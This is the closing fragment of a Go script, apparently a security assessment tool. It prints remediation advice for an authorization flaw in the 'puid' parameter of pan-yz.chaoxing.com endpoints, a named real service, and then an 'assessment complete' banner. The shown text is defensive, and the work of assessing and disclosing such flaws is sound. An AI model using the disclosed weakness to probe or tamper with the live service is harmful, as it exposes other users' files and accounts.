	fmt.Println("      Every request should verify that the authenticated user has permission")
	fmt.Println("      to access or modify the specific resource identified by the puid.")
	fmt.Println()
	fmt.Println("  (d) For write operations (delete, upload), implement additional safeguards:")
	fmt.Println("      - Require re-authentication for destructive operations")
	fmt.Println("      - Implement CSRF tokens bound to the user session")
	fmt.Println("      - Add rate limiting and audit logging for all write operations")
	fmt.Println()
	fmt.Println("  (e) Remove or deprecate the puid parameter from API endpoints. Instead,")
	fmt.Println("      derive the user identity from the server-side session, which cannot")
	fmt.Println("      be tampered with by the client.")
	fmt.Println()
	fmt.Println("  (f) Conduct a full security audit of all pan-yz.chaoxing.com endpoints,")
	fmt.Println("      as the same authorization pattern is likely used across the entire API.")
	fmt.Println()

	fmt.Println("=" + strings.Repeat("=", 79))
	fmt.Println("  ASSESSMENT COMPLETE")
	fmt.Println("=" + strings.Repeat("=", 79))
}
